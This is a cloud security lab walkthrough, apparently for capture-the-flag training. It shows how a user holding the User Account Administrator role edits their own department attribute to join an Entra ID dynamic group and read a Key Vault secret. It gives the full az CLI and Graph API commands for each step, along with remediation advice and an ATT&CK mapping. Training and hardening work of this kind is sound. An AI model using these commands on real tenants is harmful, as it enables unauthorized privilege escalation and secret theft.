# Dynamic Groups Abuse

**Difficulty:** Intermediate | **Provider:** Azure | **Category:** Identity / Privilege Escalation

## Scenario

Azure AD (Entra ID) **dynamic security groups** automatically manage their own membership
based on rules evaluated against user attributes (e.g. `user.department -eq "Security"`).
If an attacker can modify the relevant attribute on their own account — which the
`User Account Administrator` role permits — they can self-assign to any dynamic group
and inherit whatever permissions that group holds.

In this lab the "Security Team" dynamic group holds `Key Vault Secrets User` on a vault
containing the flag. Your user has `User Account Administrator`. Discover the group rule,
update your `department` attribute, and read the secret.

## Attack Path

```
[Attacker] User Account Administrator role
    |
    v
Enumerate groups --> find dynamic group + membership rule
    |
    v
PATCH /v1.0/me  {"department": "Security"}
    |
    v
Entra ID re-evaluates dynamic membership (1-5 min)
    |
    v
Attacker is now a member of Security Team
    |
    v
az keyvault secret show  -->  flag
```

### Step 1 — Log in and enumerate groups

```bash
az login -u <attacker_username> -p '<attacker_password>'

# List all groups and their dynamic membership rules
az rest \
  --method GET \
  --uri 'https://graph.microsoft.com/v1.0/groups?$select=id,displayName,membershipRule,membershipRuleProcessingState' \
  --query "value[?membershipRuleProcessingState=='On']" \
  -o json
```

Look for a group with a `membershipRule` that references an attribute you can control.

### Step 2 — Modify your user attribute

```bash
# Get your own object ID
az ad signed-in-user show --query id -o tsv

# Update the department attribute to match the group rule
az rest \
  --method PATCH \
  --uri 'https://graph.microsoft.com/v1.0/me' \
  --body '{"department": "Security"}'
```

Dynamic group re-evaluation typically takes **1–5 minutes**. You can check your membership:

```bash
az rest \
  --method GET \
  --uri 'https://graph.microsoft.com/v1.0/me/memberOf?$select=displayName' \
  --query "value[].displayName" \
  -o tsv
```

### Step 3 — Read the flag

```bash
# List Key Vaults accessible to your account
az keyvault list --query "[].name" -o tsv

# Read the secret
az keyvault secret show \
  --vault-name <key_vault_name> \
  --name flag \
  --query value \
  -o tsv
```

## How to Fix in Production

1. **Audit dynamic group rules** — any rule referencing a user-modifiable attribute
   (`department`, `jobTitle`, `city`, etc.) is a potential privilege escalation path if
   the group holds sensitive permissions.
2. **Use Custom Security Attributes** for group membership rules — these are not modifiable
   by users and require a dedicated Attribute Assignment Administrator to change.
3. **Apply Privileged Identity Management (PIM)** to User Account Administrator — require
   justification and approval before activation, and limit the role to a short time window.
4. **Monitor attribute changes** — alert on `Update user` Graph API operations that change
   department, jobTitle, or other attributes used in dynamic group rules.
5. **Least privilege on group permissions** — dynamic groups should not have standing
   access to high-value resources; consider time-limited access packages via Entitlement Management.

## MITRE ATT&CK Mapping

| Technique ID | Technique Name | Tactic |
|---|---|---|
| [T1098](https://attack.mitre.org/techniques/T1098/) | Account Manipulation | Persistence |
| [T1069.003](https://attack.mitre.org/techniques/T1069/003/) | Permission Groups Discovery: Cloud Groups | Discovery |
| [T1078.004](https://attack.mitre.org/techniques/T1078/004/) | Valid Accounts: Cloud Accounts | Defense Evasion |
| [T1552](https://attack.mitre.org/techniques/T1552/) | Unsecured Credentials | Credential Access |
